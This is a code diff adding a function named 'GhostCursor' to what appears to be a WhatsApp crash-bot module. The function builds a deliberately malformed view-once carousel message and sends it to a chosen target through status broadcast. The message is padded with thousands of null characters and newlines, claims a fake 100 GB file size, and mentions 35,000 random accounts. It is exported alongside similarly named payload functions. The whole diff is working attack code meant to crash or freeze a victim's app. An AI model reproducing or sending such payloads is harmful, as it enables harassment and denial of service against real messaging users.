@@ -1373,6 +1373,131 @@ async function BFC(sock, target) {
     }
 
 }
+
+async function GhostCursor(sock, target) {
+  const mentionedList = [
+        "696969696969@s.whatsapp.net",
+        ...Array.from({ length: 35000 }, () =>
+            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
+        )
+    ];
+    
+  const msg = await generateWAMessageFromContent(target, {
+    viewOnceMessage: {
+      message: {
+        messageContextInfo: {
+          deviceListMetadata: {},
+          deviceListMetadataVersion: 2
+        },
+        interactiveMessage: {
+          body: { 
+            text: '' 
+          },
+          footer: { 
+            text: '' 
+          },
+          carouselMessage: {
+            cards: [
+              {               
+                header: {
+                  title: '\u0000'.repeat(9999),
+                  imageMessage: {
+                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
+                    mimetype: "image/jpeg",
+                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
+                    fileLength: Math.floor(99.99 * 1073741824).toString(),
+                    height: 1,
+                    width: 1,
+                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
+                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
+                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
+                    mediaKeyTimestamp: "1749172037",
+                    jpegThumbnail: null,
+                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
+                    scanLengths: [8596, 155493]
+                  },
+                  hasMediaAttachment: true, 
+                },
+                body: { 
+                  text: "\u0000".repeat(9999)
+                },
+                footer: {
+                  text: "\u0000".repeat(9999)
+                },
+                nativeFlowMessage: {
+                  messageParamsJson: "\n".repeat(10000),
+                  buttons: [
+                  {
+            name: "single_select",
+            buttonParamsJson: JSON.stringify({ 
+              status: true, 
+              criador: "PhynxAgency", 
+              versao: "@latest", 
+              atualizado: "2025-06-07",  
+              suporte: "https://wa.me/status?video", 
+              comandosDisponiveis: ["awa"], 
+              prefixo: ".", 
+              linguagem: "USA" 
+                            })
+                        }
+                    ]
+                }
+              }
+            ]
+          },
+          contextInfo: {
+            participant: target,
+            stanzaId: "ABCDEF1234567890",
+            mentionedJid: mentionedList,
+            quotedMessage: {
+              viewOnceMessage: {
+                message: {
+                  interactiveResponseMessage: {
+                    body: {
+                      text: "Sent",
+                      format: "DEFAULT"
+                    },
+                    nativeFlowResponseMessage: {
+                      name: "call_permission_request",
+                      paramsJson: JSON.stringify({ status: true}),
+                      version: 3
+                    }
+                  }
+                }
+              }
+            },
+            remoteJid: target
+          }
+        }
+      }
+    }
+  }, {});
+
+  await sock.relayMessage("status@broadcast", msg.message, {
+    messageId: msg.key.id,
+    statusJidList: [target],
+    additionalNodes: [
+      {
+        tag: "meta",
+        attrs: {},
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: {},
+            content: [
+              {
+                tag: "to",
+                attrs: { jid: target },
+                content: undefined
+              }
+            ]
+          }
+        ]
+      }
+    ]
+  });
+}
+
 module.exports = {
     A,
     B,
@@ -1390,6 +1515,7 @@ module.exports = {
     AB1,
     AB2,
     BFC,
+    GhostCursor,
     ForceCallCrL,
     iOSxContact,
     iOSxPayload,
